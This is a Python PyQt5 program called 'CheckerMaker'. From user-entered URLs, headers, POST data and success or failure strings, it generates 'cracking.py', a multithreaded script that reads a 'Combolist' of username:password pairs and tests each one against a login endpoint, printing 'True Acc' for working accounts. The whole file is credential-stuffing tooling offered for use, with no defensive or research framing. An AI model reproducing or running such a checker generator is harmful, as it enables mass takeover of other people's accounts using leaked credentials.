
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMainWindow, QApplication, QWidget, QPushButton, QAction, QLineEdit, QMessageBox, QLabel, QPlainTextEdit
from PyQt5.QtGui import QIcon
from PyQt5.QtCore import pyqtSlot
import os 

class Ui_CheckerMaker(object):
    def setupUi(self, CheckerMaker):
        self.istek = "\n"
        self.rsayi = 0
        self.headerss = {}
        CheckerMaker.setObjectName("CheckerMaker")
        CheckerMaker.resize(1200, 621)
        self.button = QtWidgets.QPushButton(CheckerMaker)
        self.button.setGeometry(QtCore.QRect(120, 350, 101, 23))
        self.button.setObjectName("button")
        self.textbox = QtWidgets.QLineEdit(CheckerMaker)
        self.textbox.setGeometry(QtCore.QRect(100, 30, 201, 21))
        self.textbox.setObjectName("textbox")
        self.label = QtWidgets.QLabel(CheckerMaker)
        self.label.setGeometry(QtCore.QRect(10, 30, 61, 16))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(CheckerMaker)
        self.label_2.setGeometry(QtCore.QRect(30, 70, 61, 16))
        self.label_2.setObjectName("label_2")
        self.textboxx = QtWidgets.QLineEdit(CheckerMaker)
        self.textboxx.setGeometry(QtCore.QRect(100, 70, 201, 21))
        self.textboxx.setObjectName("textboxx")
        self.label_3 = QtWidgets.QLabel(CheckerMaker)
        self.label_3.setGeometry(QtCore.QRect(20, 110, 61, 16))
        self.label_3.setObjectName("label_3")
        self.textbox3 = QtWidgets.QLineEdit(CheckerMaker)
        self.textbox3.setGeometry(QtCore.QRect(100, 110, 201, 21))
        self.textbox3.setObjectName("textbox3")
        self.label_4 = QtWidgets.QLabel(CheckerMaker)
        self.label_4.setGeometry(QtCore.QRect(150, 150, 61, 16))
        self.label_4.setObjectName("label_4")
        self.label_5 = QtWidgets.QLabel(CheckerMaker)
        self.label_5.setGeometry(QtCore.QRect(410, 30, 61, 21))
        self.label_5.setObjectName("label_5")
        self.textbox32 = QtWidgets.QLineEdit(CheckerMaker)
        self.textbox32.setGeometry(QtCore.QRect(460, 30, 201, 21))
        self.textbox32.setObjectName("textbox32")
        self.label_6 = QtWidgets.QLabel(CheckerMaker)
        self.label_6.setGeometry(QtCore.QRect(410, 70, 61, 21))
        self.label_6.setObjectName("label_6")
        self.textbox33 = QtWidgets.QLineEdit(CheckerMaker)
        self.textbox33.setGeometry(QtCore.QRect(460, 70, 201, 21))
        self.textbox33.setObjectName("textbox33")
        self.button2 = QtWidgets.QPushButton(CheckerMaker)
        self.button2.setGeometry(QtCore.QRect(500, 120, 101, 23))
        self.button2.setObjectName("button2")
        self.button2.clicked.connect(self.kaydetkey)
        self.pushButton_3 = QtWidgets.QPushButton(CheckerMaker)
        self.pushButton_3.setGeometry(QtCore.QRect(510, 370, 101, 23))
        self.pushButton_3.setObjectName("pushButton_3")
        self.label_7 = QtWidgets.QLabel(CheckerMaker)
        self.label_7.setGeometry(QtCore.QRect(420, 270, 61, 21))
        self.label_7.setObjectName("label_7")
        self.textEdit_6 = QtWidgets.QLineEdit(CheckerMaker)
        self.textEdit_6.setGeometry(QtCore.QRect(490, 310, 201, 21))
        self.textEdit_6.setObjectName("textEdit_6")
        self.sss = QtWidgets.QLineEdit(CheckerMaker)
        self.sss.setGeometry(QtCore.QRect(490, 270, 201, 21))
        self.sss.setObjectName("sss")
        self.label_8 = QtWidgets.QLabel(CheckerMaker)
        self.label_8.setGeometry(QtCore.QRect(430, 310, 61, 21))
        self.label_8.setObjectName("label_8")
        self.button216 = QtWidgets.QPushButton(CheckerMaker)
        self.button216.setGeometry(QtCore.QRect(320, 480, 75, 23))
        self.button216.setObjectName("button216")
        self.button216.clicked.connect(self.file)
        self.button.clicked.connect(self.on_click)
        self.pushButton_3.clicked.connect(self.spliT)
        self.plainTextEdit = QtWidgets.QPlainTextEdit(CheckerMaker)
        self.plainTextEdit.setGeometry(QtCore.QRect(100, 170, 251, 171))
        self.plainTextEdit.setObjectName("plainTextEdit")
        self.plainTextEdit.insertPlainText("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\n")
        self.plainTextEdit.insertPlainText("Accept: */*\n")
        self.plainTextEdit.insertPlainText("Pragma: no-cache")
        self.label_81 = QtWidgets.QLabel(CheckerMaker)
        self.label_81.setGeometry(QtCore.QRect(10, 100, 251, 171))
        self.label_81.setObjectName("label_81")
        self.plainTextEdit2 = QtWidgets.QPlainTextEdit(CheckerMaker)
        self.plainTextEdit2.setGeometry(QtCore.QRect(700, 25, 450, 500))
        self.pushButton_12 = QtWidgets.QPushButton(CheckerMaker)
        self.pushButton_12.setGeometry(QtCore.QRect(850, 570, 101, 23))
        self.pushButton_12.setObjectName("pushButton_3")
        self.pushButton_12.clicked.connect(self.file2)
        self.plainTextEdit2.setObjectName("plainTextEdit2")
        self.retranslateUi(CheckerMaker)
        QtCore.QMetaObject.connectSlotsByName(CheckerMaker)

    def retranslateUi(self, CheckerMaker):
        _translate = QtCore.QCoreApplication.translate
        CheckerMaker.setWindowTitle(_translate("CheckerMaker", "CheckerMaker"))
        self.button.setText(_translate("CheckerMaker", "Add Req Option"))
        self.label.setText(_translate("CheckerMaker", "post OR get"))
        self.label_2.setText(_translate("CheckerMaker", "URL"))
        self.label_3.setText(_translate("CheckerMaker", "Post Data"))
        self.label_5.setText(_translate("CheckerMaker", "True Key"))
        self.label_6.setText(_translate("CheckerMaker", "False Key"))
        self.button2.setText(_translate("CheckerMaker", "Add Keys"))
        self.pushButton_3.setText(_translate("CheckerMaker", "Add Keys"))
        self.pushButton_12.setText(_translate("CheckerMaker", "Save With Script"))
        self.label_7.setText(_translate("CheckerMaker", "Right String"))
        self.label_8.setText(_translate("CheckerMaker", "Left String"))
        self.button216.setText(_translate("CheckerMaker", "Save"))
        self.label_81.setText(_translate("CheckerMaker", "Headers"))

    def on_click(self):
        yakisikli = self.plainTextEdit.toPlainText()
        with open("headerlar.txt","w") as f:
            f.write(yakisikli)
        headerlines = open("headerlar.txt","r").readlines()
        for line in headerlines:
            line2 = line.split(":")
            line3 = line2[1].replace("\n", "")
            self.headerss[str(line2[0])] = line3
        textboxValue = self.textbox.text()
        textboxValue2 = self.textboxx.text()
        textboxValue3 = self.textbox3.text()
        if str(textboxValue).lower() == "get":
                if self.rsayi == 0:
                    self.istek += f'    r1 = requests.{textboxValue}("{textboxValue2}",headers={self.headerss})\n'
                    self.rsayi += 1
                else:
                    self.istek += f'    r{self.rsayi+1} = requests.{textboxValue}("{textboxValue2}",headers={self.headerss})\n'
                    self.rsayi += 1
        elif str(textboxValue).lower() == "post":
                if self.rsayi == 0:
                    self.istek += f'    r1 = requests.{textboxValue}("{textboxValue2}",data=f"{textboxValue3}",headers={self.headerss})\n'
                    self.rsayi += 1
                else:
                    self.rsayi += 1
                    self.istek += f'    r{self.rsayi+1} = requests.{textboxValue}("{textboxValue2}",data=f"{textboxValue3}",headers={self.headerss})\n'
        os.system("cls")
        print(self.istek)
        self.plainTextEdit2.setPlainText(self.istek)

            
    def spliT(self):
        right = self.sss.text()
        left = self.textEdit_6.text()
        if self.rsayi == 0:
                self.istek += f"""
     koko216 = r.text.split('{right}')[1].split('{left}')[0] 
"""
        else:
                self.istek += f"""
     koko216 = r{self.rsayi}.text.split('{right}')[1].split('{left}')[0] 
"""
        os.system("cls")
        self.plainTextEdit2.setPlainText(self.istek)
            
    def kaydetkey(self):
        falsekey = self.textbox33.text()
        truekey = self.textbox32.text()
        if self.rsayi == 0:
                self.istek += f"""
    if '{truekey}' in r.text:
            print("True Acc")
    if '{falsekey}' in r.text:
            print("False Acc")
            return 
"""
        else:
                self.istek += f"""
    if "{truekey}" in r{self.rsayi}.text:
            print("True Acc")
    if "{falsekey}" in r{self.rsayi}.text:
            print("False Acc")
            return 
"""
        os.system("cls")
        print(self.istek)
        self.plainTextEdit2.setPlainText(self.istek)

    def file(self):
        try:
            os.remove("cracking.py")
        except:
            pass
        file216 = open("cracking.py","w")
        file216.write(f"""
import requests
import threading
import time
import sys
deger2 = 0
koko = ""
def combo():

        combos = open(str(input("Combolist --> ")), encoding='utf8', errors = 'ignore').readlines()
        User = []
        Pass = []
        for y in combos:
            ez = y.replace("\\n", "").split(":")
            try:
                User.append(ez[0])
                Pass.append(ez[1])
            except:
                pass
        return User,Pass






def crack(User1,Pass1):
  try:
    {self.istek}
  except:
    crack(User1,Pass1)
deger = 0

def baslatici():
    num=int('0')
    User,Pass=combo()
    threadsnum = 100
    while 1:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
                    threading.Thread(target=crack, args=(User[num], Pass[num])).start()
                    num += 1
                else:
                    exit()
            
                    
                    time.sleep(0.6)
                    
        else:
            time.sleep(0.3)
baslatici()

""")
        os.system("cls")
        print(self.istek)
    def file2(self):
        self.istek = self.plainTextEdit2.toPlainText()
        try:
            os.remove("cracking.py")
        except:
            pass
        file216 = open("cracking.py","a+")
        file216.write(f"""
import requests
import threading
import time
import sys
deger2 = 0
koko = ""
def combo():

        combos = open(str(input("Combolist --> ")), encoding='utf8', errors = 'ignore').readlines()
        User = []
        Pass = []
        for y in combos:
            ez = y.replace("\\n", "").split(":")
            try:
                User.append(ez[0])
                Pass.append(ez[1])
            except:
                pass
        return User,Pass






def crack(User1,Pass1):
  try:
    {self.istek}
  except:
    crack(User1,Pass1)
deger = 0

def baslatici():
    num=int('0')
    User,Pass=combo()
    threadsnum = 100
    while 1:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
                    threading.Thread(target=crack, args=(User[num], Pass[num])).start()
                    num += 1
                else:
                    exit()
            
                    
                    time.sleep(0.6)
                    
        else:
            time.sleep(0.3)
baslatici()

""")
        os.system("cls")
        print(self.istek)
if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    CheckerMaker = QtWidgets.QDialog()
    ui = Ui_CheckerMaker()
    ui.setupUi(CheckerMaker)
    CheckerMaker.show()
    sys.exit(app.exec_())
